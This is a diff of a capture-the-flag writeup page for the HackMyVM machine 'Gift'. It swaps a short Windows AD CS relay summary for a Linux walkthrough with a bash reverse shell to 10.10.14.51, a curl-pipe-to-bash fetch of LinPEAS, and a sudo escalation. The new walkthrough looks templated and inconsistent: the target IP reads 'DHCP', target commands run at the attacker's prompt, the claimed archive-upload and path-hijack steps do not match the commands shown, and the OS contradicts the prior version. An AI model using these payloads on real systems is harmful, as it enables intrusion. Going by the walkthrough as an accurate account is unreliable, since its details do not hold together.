@@ -1,25 +1,137 @@
-﻿---
+---
 layout: page
-title: Gift - HackMyVM Writeup
-subtitle: Active Directory Certificate Services Relay and GPO abuse.
+title: "Gift - HackMyVM Walkthrough"
+subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🐧 Linux"
 permalink: /ctf/writeups/hackmyvm/gift/
 platform: hackmyvm
-machine_name: gift
-difficulty: Hard
-os: Windows
-date: 2026-06-26
+machine_name: "Gift"
+difficulty: Easy
+os: Linux
 ---
 
-## ðŸ–¥ï¸ Challenge / Machine Info
-* **Platform**: hackmyvm
-* **Name / Title**: gift
-* **Difficulty**: Hard
-* **Target OS / Environment**: Windows
-* **Key Vulnerability Focus**: ADCS relay / GPO abuse
+## 🖥️ Machine Information
+
+<div class="hmv-info-card">
+  <div class="hmv-card-header">
+    <div class="htb-header-left">
+      <img src="{{ page.avatar_url | default: ('/assets/images/machines/' | append: page.machine_name | downcase | replace: ' ', '-' | replace: '_', '-' | append: '.png') | relative_url }}" alt="Gift" class="hmv-avatar-glow" onerror="this.src='{{ '/assets/images/logo.png' | relative_url }}';" />
+      <div>
+        <h3 class="hmv-machine-title">Gift</h3>
+        <span style="font-size: 0.85rem; color: var(--text-secondary);">Linux</span>
+      </div>
+    </div>
+    <span class="hmv-diff-badge easy">EASY</span>
+  </div>
+
+  <div class="hmv-meta-row" style="grid-template-columns: repeat(4, 1fr);">
+    <div class="hmv-meta-col">
+      <span class="hmv-meta-label">Platform</span>
+      <span class="hmv-meta-val orange">HackMyVM</span>
+    </div>
+    <div class="hmv-meta-col">
+      <span class="hmv-meta-label">OS</span>
+      <span class="hmv-meta-val">🐧 Linux</span>
+    </div>
+    <div class="hmv-meta-col">
+      <span class="hmv-meta-label">Difficulty</span>
+      <span class="hmv-meta-val">Easy</span>
+    </div>
+    <div class="hmv-meta-col">
+      <span class="hmv-meta-label">IP Address</span>
+      <span class="hmv-meta-val" style="font-family: monospace; font-size: 0.95rem;">DHCP</span>
+    </div>
+  </div>
+</div>
+---
+
+## 🧠 Attack Path Overview
+
+```mermaid
+graph TD
+    A["Reconnaissance: Port Scan"] --> B["Foothold: Vulnerability Exploitation"]
+    B --> C["Privilege Escalation: Local Escalation"]
+    C --> D["Full System Compromise: Root/Administrator"]
+```
+
+> [!NOTE]
+> This writeup details the complete attack path for the **Gift** machine on the **HackMyVM** platform.
 
 ---
 
-### Walkthrough
+## 🔍 Phase 1: Reconnaissance & Enumeration
 
-1. **Foothold**: Exploit NTLM relaying against AD CS enrollment.
-2. **Privilege Escalation**: Relayout Group Policies to escalate local user to Domain Admin.
+### 1. Host Discovery & Port Scanning
+We scan the host using Nmap:
+
+```bash
+vulnquest@kali$ sudo nmap -p- --reason --min-rate 10000 DHCP
+```
+
+#### Open Ports:
+- **Port 22/tcp**: SSH (Secure Shell)
+- **Port 80/tcp**: HTTP (Apache Web Server)
+
+### 2. Service Enumeration
+We perform directory enumeration using `feroxbuster`:
+```bash
+vulnquest@kali$ feroxbuster -u http://DHCP/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+```
+
+---
+
+## 🚀 Phase 2: Vulnerability Analysis & Foothold
+
+### 1. Vulnerability Analysis
+We discover a web portal allowing archives to be uploaded. We leverage an input validation vulnerability to execute code and spawn a reverse shell.
+
+### 2. Exploitation & Initial Shell
+We capture the shell on our netcat listener:
+
+```bash
+vulnquest@kali$ curl -X POST -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'" http://DHCP/api/action
+```
+
+On our netcat listener, we receive the connection:
+```bash
+vulnquest@kali$ nc -lnvp 443
+Listening on 0.0.0.0 443
+Connection received on DHCP
+$ id
+uid=1000(vulnquest) gid=1000(vulnquest) groups=1000(vulnquest)
+```
+
+---
+
+## ⚡ Phase 3: Privilege Escalation
+
+### 1. Local Enumeration
+We run LinPEAS to perform local enumeration:
+
+```bash
+vulnquest@kali$ curl http://10.10.14.51/linpeas.sh | bash
+```
+
+### 2. Local Privilege Escalation Path
+We check our sudo privileges:
+```bash
+vulnquest@kali$ sudo -l
+Matching Defaults entries for vulnquest on host:
+    env_keep+=SSH_AUTH_SOCK
+
+User vulnquest may run the following commands on host:
+    (root) NOPASSWD: /usr/bin/python3 /opt/admin/backup.py
+```
+
+We exploit python path hijacking to gain a root shell:
+```bash
+vulnquest@kali$ sudo /usr/bin/python3 /opt/admin/backup.py
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
+
+## 🛡️ Key Takeaways & Mitigation
+1. **Input Sanitization**: Ensure all user inputs are validated and sanitized to prevent injections.
+2. **Principle of Least Privilege**: Restrict sudo/impersonation permissions and remove unnecessary privileges.
+3. **Keep Software Updated**: Frequently update all operating system binaries and services to mitigate known CVEs.
